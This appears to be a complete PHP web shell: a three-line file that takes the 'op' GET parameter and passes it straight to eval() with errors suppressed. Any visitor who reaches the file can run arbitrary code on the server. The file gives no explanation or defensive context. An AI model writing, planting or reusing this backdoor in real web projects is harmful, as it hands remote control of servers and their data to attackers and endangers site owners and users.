<?php 
   $xsser = $_GET["op"]; 
   @eval("\$safedg = $xsser;") 
?>